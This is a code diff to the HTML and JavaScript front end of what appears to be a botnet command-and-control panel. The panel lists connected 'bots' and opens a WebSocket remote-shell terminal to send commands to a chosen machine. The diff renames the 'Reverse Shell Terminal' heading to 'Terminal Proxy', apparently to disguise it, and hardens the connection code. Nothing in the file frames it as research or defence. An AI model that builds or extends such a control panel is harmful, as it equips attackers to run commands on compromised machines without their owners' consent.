@@ -15,6 +15,7 @@
             padding: 16px;
             border: 1px solid #450a0a;
             line-height: 1.5;
+            white-space: pre-wrap;
         }
     </style>
 </head>
@@ -29,12 +30,12 @@
         </div>
 
         <div>
-            <h2 class="text-2xl mb-4">Reverse Shell Terminal</h2>
+            <h2 class="text-2xl mb-4">Terminal Proxy</h2>
             <div id="terminal" class="terminal"></div>
             <div class="flex mt-3 gap-2">
-                <input id="terminal_input" class="flex-1 p-4 bg-zinc-900 border border-red-900 rounded"
+                <input id="terminal_input" class="flex-1 p-4 bg-zinc-900 border border-red-900 rounded text-green-500"
                     placeholder="whoami, ls, pwd..." onkeypress="if(event.key === 'Enter') sendTerminalCmd()">
-                <button onclick="sendTerminalCmd()" class="bg-green-600 px-8 py-4 rounded">SEND</button>
+                <button onclick="sendTerminalCmd()" class="bg-green-600 text-white px-8 py-4 rounded font-bold hover:bg-green-500">SEND</button>
             </div>
         </div>
     </div>
@@ -44,26 +45,34 @@
         let terminalWs = null;
 
         async function updateBots() {
-            const res = await fetch('/bots');
-            const data = await res.json();
-            document.getElementById('count').textContent = data.bots.length;
+            try {
+                const res = await fetch('/bots', { credentials: 'include' });
+                if (!res.ok) return;
+                const data = await res.json();
+                document.getElementById('count').textContent = data.bots.length;
 
-            let html = '';
-            data.bots.forEach(id => {
-                html += `<div onclick="selectBot('${id}')" class="bg-zinc-900 p-4 rounded border border-red-900 cursor-pointer hover:border-red-500">${id}</div>`;
-            });
-            document.getElementById('botlist').innerHTML = html || '<p class="text-zinc-500">No bots online</p>';
+                let html = '';
+                data.bots.forEach(id => {
+                    const activeClass = id === currentBot ? 'border-green-500 text-green-400' : 'border-red-900 hover:border-red-500';
+                    html += `<div onclick="selectBot('${id}')" class="bg-zinc-900 p-4 rounded border ${activeClass} cursor-pointer transition-colors">${id}</div>`;
+                });
+                document.getElementById('botlist').innerHTML = html || '<p class="text-zinc-500">No bots online</p>';
+            } catch (e) {
+                console.error(e);
+            }
         }
 
         function selectBot(id) {
             currentBot = id;
-            document.getElementById('terminal').innerHTML += `<span class="text-green-400">[${id}] Session started</span><br>`;
+            document.getElementById('terminal').innerHTML += `<span class="text-green-400">[${id}] Session started via Proxy</span><br>`;
+            updateBots();
             connectTerminal(id);
         }
 
         function connectTerminal(botId) {
             if (terminalWs) terminalWs.close();
-            terminalWs = new WebSocket(`ws://${location.host}/terminal/${botId}`);
+            const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            terminalWs = new WebSocket(`${protocol}//${location.host}/terminal/${botId}`);
 
             terminalWs.onmessage = function (event) {
                 const line = document.createElement('div');
@@ -71,17 +80,32 @@
                 document.getElementById('terminal').appendChild(line);
                 document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
             };
+            
+            terminalWs.onclose = function () {
+                const line = document.createElement('div');
+                line.className = "text-red-500";
+                line.textContent = "[!] Terminal disconnected";
+                document.getElementById('terminal').appendChild(line);
+            }
         }
 
         function sendTerminalCmd() {
             const input = document.getElementById('terminal_input');
             const cmd = input.value.trim();
             if (!cmd || !currentBot) return;
-            if (terminalWs) terminalWs.send(cmd);
+            if (terminalWs && terminalWs.readyState === WebSocket.OPEN) {
+                terminalWs.send(cmd);
+                
+                const line = document.createElement('div');
+                line.className = "text-yellow-400 mt-2";
+                line.textContent = `> ${cmd}`;
+                document.getElementById('terminal').appendChild(line);
+                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+            }
             input.value = "";
         }
 
-        setInterval(updateBots, 2000);
+        setInterval(updateBots, 3000);
         updateBots();
     </script>
 </body>
